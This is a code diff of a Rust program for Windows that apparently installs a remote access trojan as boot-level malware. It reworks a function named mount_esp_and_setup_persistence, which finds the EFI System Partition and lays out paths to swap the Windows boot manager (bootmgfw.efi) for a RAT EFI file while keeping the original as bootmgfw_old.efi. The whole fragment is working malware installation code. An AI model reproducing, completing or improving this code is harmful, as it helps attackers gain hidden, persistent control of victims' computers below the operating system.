@@ -19,8 +19,8 @@ use windows_sys::Win32::Security::{
     TOKEN_PRIVILEGES, TOKEN_QUERY,
 };
 use windows_sys::Win32::Storage::FileSystem::{
-    CreateFileW, DeleteVolumeMountPointW, FILE_SHARE_READ, FILE_SHARE_WRITE, FindFirstVolumeW,
-    FindNextVolumeW, FindVolumeClose, OPEN_EXISTING, SetVolumeMountPointW,
+    CreateFileW, FILE_SHARE_READ, FILE_SHARE_WRITE, FindFirstVolumeW, FindNextVolumeW,
+    FindVolumeClose, OPEN_EXISTING,
 };
 use windows_sys::Win32::System::IO::DeviceIoControl;
 use windows_sys::Win32::System::Ioctl::{
@@ -231,27 +231,10 @@ fn mount_esp_and_setup_persistence() -> bool {
             .unwrap_or(volname.len());
         if is_esp_volume(&mut volname[..len]) {
             let name = String::from_utf16_lossy(&volname[..len]);
-            println!("Found ESP volume {name:?}");
+            let volume = PathBuf::from(name);
+            println!("Found ESP volume {volume:?}");
 
-            if unsafe { SetVolumeMountPointW(w!("S:\\"), volname.as_ptr()) } == 0 {
-                let error = unsafe { GetLastError() };
-                eprintln!("SetVolumeMountPointW error: 0x{error:X} ({error})");
-                return false;
-            }
-
-            println!("Mounted ESP to S:\\");
-            let guard2 = DropGuard::new((), |_| {
-                let status = unsafe { DeleteVolumeMountPointW(w!("S:\\")) };
-
-                if status == 0 {
-                    let error = unsafe { GetLastError() };
-                    eprintln!("DeleteVolumeMountPointW error: 0x{error:X} ({error})");
-                } else {
-                    println!("Unmounted ESP from S:\\");
-                }
-            });
-
-            let bootdir = PathBuf::from("S:\\EFI\\Microsoft\\Boot");
+            let bootdir = volume.join("EFI").join("Microsoft").join("Boot");
             let bootmgfw_old = bootdir.join("bootmgfw_old.efi");
             let bootmgfw = bootdir.join("bootmgfw.efi");
             let rat_efi = bootdir.join(RAT_EFI_FILE_NAME);
@@ -287,7 +270,6 @@ fn mount_esp_and_setup_persistence() -> bool {
                 return false;
             }
 
-            drop(guard2);
             return true;
         }
 
